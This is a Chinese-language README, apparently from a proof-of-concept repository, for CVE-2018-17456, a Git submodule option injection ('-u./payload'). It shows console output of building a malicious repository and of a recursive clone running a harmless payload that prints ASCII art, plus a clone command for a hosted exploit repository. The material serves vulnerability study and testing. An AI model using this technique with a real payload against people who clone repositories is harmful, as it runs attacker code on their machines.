# CVE-2018-17456

### 漏洞简介
+ 漏洞名称： Git输入验证错误漏洞
+ CNNVD编号：CNNVD-201810-234
+ 危害等级：超危
+ CVE编号：CVE-2018-17456
+ 漏洞类型：输入验证错误
+ 发布时间：2018-10-08
+ 威胁类型：远程
+ 更新时间：2019-04-25
+ 厂商：debian
+ 漏洞来源：Atlassian,TerryZh...
+ 漏洞简介：Git是一套免费、开源的分布式版本控制系统。Git中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。以下版本受到影响：Git2.14.5之前版本，2.15.3之前的2.15.x版本，2.16.5之前的2.16.x版本，2.17.2之前的2.17.x版本，2.18.1之前的2.18.x版本，2.19.1之前的2.19.x版本。


### 漏洞复现
+ 由于Github安全机制的问题，不能上传恶意项目，所以你可以运行脚本 `build.sh` 在本地构造这个项目进行学习和测试。
+ 我使用的Git的版本为 `git-2.12.1`
+ 过程与效果如下：

```bash
[anonymking@localhost test]$ ./build.sh 
Initialized empty Git repository in /home/anonymking/Desktop/test/CVE-2018-17456-PoC/Submodule/.git/
[master (root-commit) 5b1e97c] submodule
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 hgt_blank
Initialized empty Git repository in /home/anonymking/Desktop/test/CVE-2018-17456-PoC/CVE-2018-17456-PoC/.git/
Cloning into '/home/anonymking/Desktop/test/CVE-2018-17456-PoC/CVE-2018-17456-PoC/exploit:exploit'...
done.
[master (root-commit) ed1914d] CVE-2018-17456
 3 files changed, 6 insertions(+)
 create mode 100644 .gitmodules
 create mode 160000 exploit:exploit
 create mode 100755 payload
git clone --recursive "/home/anonymking/Desktop/test/CVE-2018-17456-PoC/CVE-2018-17456-PoC" des_dir



[anonymking@localhost test]$ git clone --recursive "/home/anonymking/Desktop/test/CVE-2018-17456-PoC/CVE-2018-17456-PoC" test
Cloning into 'test'...
done.
Submodule 'exploit:exploit' (-u./payload) registered for path 'exploit:exploit'
Cloning into 'exploit'...


*********************************************
                   _ooOoo_
                  o8888888o
                  88" . "88
                  (| -_- |)
                  O\  =  /O
               ____/`---'\____
             .'  \\|     |//  `.
            /  \\|||  :  |||//  \
           /  _||||| -:- |||||-  \
           |   | \\\  -  /// |   |
           | \_|  ''\---/''  |   |
           \  .-\__  `-`  ___/-. /
         ___`. .'  /--.--\  `. . __
      ."" '&lt;  `.___\_&lt;|>_/___.'  >'"".
     | | :  `- \`.;`\ _ /`;.`/ - ` : | |
     \  \ `-.   \_ __\ /__ _/   .-` /  /
======`-.____`-.___\_____/___.-`____.-'======
                   `=---='
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
fatal: clone of '-u./payload' into submodule path '/home/anonymking/Desktop/test/test/exploit:exploit' failed
Failed to clone 'exploit:exploit' a second time, aborting
```
+ 我在payload中构建的恶意代码就是输出一个佛陀，因此得见我佛也就代表着测试成功了；这个地方其实会输出两次，因为clone子项目失败的时候会有一次重试。


### 参考资料
+ 项目 [poc-submodule](https://github.com/joernchen/poc-submodule)


---


### 意外发现
+ 我居然在Coding上面成功构建了这个项目 —— [CVE-2018-17456](https://dev.tencent.com/u/anonymking/p/CVE-2018-17456/git)
+ 使用方法：

```bash
git clone --recursive https://dev.tencent.com/u/anonymking/p/CVE-2018-17456/git test
```

+ 另外，推荐两个相似的漏洞放在一起学习： [CVE-2017-1000117](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000117)、[CVE-2018-11235](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11235)